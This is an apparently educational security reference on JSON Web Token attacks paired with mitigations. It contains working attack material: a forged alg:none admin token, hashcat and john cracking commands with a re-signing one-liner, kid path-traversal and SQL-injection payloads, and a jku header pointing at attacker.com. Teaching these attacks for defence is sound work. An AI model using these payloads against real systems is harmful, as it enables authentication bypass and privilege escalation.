JWT Attacks

Auth / Session · CWE-347 · Improper Verification of Cryptographic Signature — critical in every modern API

A JWT (JSON Web Token) is three Base64URL-encoded parts joined by dots: Header · Payload · Signature. The server signs the payload with a secret key so it can verify the token wasn't tampered with — but only if it actually checks the signature properly.

Critical fact: the payload is NOT encrypted — just Base64 encoded

Anyone can decode a JWT and read every claim. Base64URL decode the middle part and you see the raw JSON. The signature only proves the payload wasn't modified — it provides zero confidentiality. Never put passwords, secrets, or sensitive PII in a JWT payload.

① alg:none — signature strippingCritical

The JWT spec allows alg:none to mean "no signature required." Vulnerable libraries accept a token with an empty signature if the header says none.

# Original token header: {"alg": "HS256", "typ": "JWT"} # Attacker changes header to: {"alg": "none", "typ": "JWT"} # And strips the signature — token becomes: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0 <-- header .eyJzdWIiOiIxMDAxIiwicm9sZSI6ImFkbWluIn0 <-- payload (role changed!) . <-- empty signature # Vulnerable server accepts this as valid! # CVE-2015-9235 (jsonwebtoken), CVE-2022-21449 (Java ECDSA)
② RS256 → HS256 algorithm confusionCritical

When a server uses RS256 (asymmetric), its public key is public. If the server also accepts HS256 (symmetric), the attacker uses the public key as the HMAC secret — and the server verifies the token with the same public key it uses to verify RS256 signatures.

# Server normally uses RS256: # Signs with: private key (secret) # Verifies with: public key (public!) # Attack: switch header to HS256 {"alg": "HS256", "typ": "JWT"} # Sign the tampered payload with the PUBLIC KEY as the HMAC secret import hmac, hashlib, base64 secret = open('server_public_key.pem').read() # now sign the forged payload... # Server logic (vulnerable): if header.alg == "HS256": verify(token, secret=public_key) # public_key is known! # → Attacker can forge any token
③ Weak secret — brute forceHigh

HS256/384/512 tokens signed with a short or guessable secret can be cracked offline with hashcat or jwt-cracker. Common weak secrets: secret, password, changeme, the app name, empty string.

# hashcat — GPU accelerated JWT crack hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt # jwt-cracker (Node.js) jwt-cracker -t <token> -w wordlist.txt # john the ripper john --wordlist=rockyou.txt --format=HMAC-SHA256 token.txt # After cracking "secret123" → re-sign any payload: python3 -c " import jwt print(jwt.encode({'sub':'1001','role':'admin'}, 'secret123', algorithm='HS256')) "
④ kid (Key ID) injectionHigh

The kid header parameter tells the server which key to use for verification. If the server uses kid to look up a key from a file or database without sanitization — SQL injection or path traversal applies.

# kid pointing to a file the attacker controls: {"alg": "HS256", "kid": "../../dev/null"} # Server reads /dev/null → empty string → sign with empty string! # kid SQL injection: {"alg": "HS256", "kid": "x' UNION SELECT 'attacker_secret' -- -"} # Server queries DB → returns 'attacker_secret' → attacker knows the key!
⑤ jwks_uri / jku header injectionAdvanced

The jku (JWK Set URL) header tells the server where to fetch the public key. If the server fetches any URL from the token itself, the attacker hosts their own JWKS and the server verifies against the attacker's key.

# Attacker generates their own RSA key pair # Hosts public key at: https://attacker.com/jwks.json # Forges token with header: {"alg": "RS256", "jku": "https://attacker.com/jwks.json"} # Signs with their own private key # Server fetches attacker's JWKS → verifies with attacker's public key → passes!
⑥ Claim manipulation (no sig check)Critical if present

Some endpoints decode the JWT but never verify the signature — they just trust the claims. Or they only check the signature for some endpoints. Test by simply editing the payload and resubmitting with the original signature.

# Original payload: {"sub": "1001", "role": "user"} # Modified payload: {"sub": "1001", "role": "admin"} # Keep the original signature — if the server doesn't verify: # → role=admin is accepted # Test: change exp (expiry) to a past timestamp # If the server still accepts the expired token → no sig check!

① Explicitly specify allowed algorithms — never trust header Root fix
The single most important fix. Never let the token header decide which algorithm to use — hardcode it server-side.
## Node.js (jsonwebtoken) // Vulnerable — trusts the alg from the token header jwt.verify(token, secret) // Safe — explicitly set allowed algorithm jwt.verify(token, secret, { algorithms: ['HS256'] }) ## Python (PyJWT) # Vulnerable jwt.decode(token, secret) # Safe jwt.decode(token, secret, algorithms=['HS256']) ## Java (jjwt) // Safe Jwts.parserBuilder() .setSigningKey(secret) .requireAlgorithm("HS256") // explicit .build() .parseClaimsJws(token);
② Use a strong secret (≥ 256 bits, random) Essential for HS*
A weak HS256 secret can be cracked offline in seconds. The secret must be cryptographically random and at least 32 bytes (256 bits).
## Generate a strong secret node -e "console.log(require('crypto').randomBytes(64).toString('hex'))" openssl rand -hex 64 python3 -c "import secrets; print(secrets.token_hex(64))" ## Store in environment variable — never hardcode JWT_SECRET=<64-char-random-hex> ## Even better: use RS256 with 2048-bit keys # RS256 = RSA + SHA256, asymmetric — secret never shared openssl genrsa -out private.pem 2048 openssl rsa -in private.pem -pubout -out public.pem
③ Validate all claims — especially exp, iss, aud Good
A valid signature is not enough. Always verify expiry, issuer, and audience. Reject tokens with missing or unexpected values.
## Node.js — full claims validation jwt.verify(token, secret, { algorithms: ['HS256'], issuer: 'https://auth.myapp.com', audience: 'https://api.myapp.com', // exp is checked automatically }) ## Python jwt.decode(token, secret, algorithms=['HS256'], options={'require': ['exp', 'iss', 'aud']}, issuer='https://auth.myapp.com', audience='https://api.myapp.com' )
④ Sanitize kid, jku, x5u header params If using these
If you use the kid header, validate it against a strict allowlist of known key IDs. Never use it as a file path or SQL query input. If using jku, only accept URLs from a hardcoded trusted domain.
⑤ Token revocation & rotation
Keep JWT lifetimes short (15 min for access tokens)  ·  Use refresh tokens stored server-side for revocation  ·  Maintain a blocklist for compromised tokens  ·  Rotate signing keys periodically  ·  Never put sensitive data in the payload — it's only Base64, not encrypted
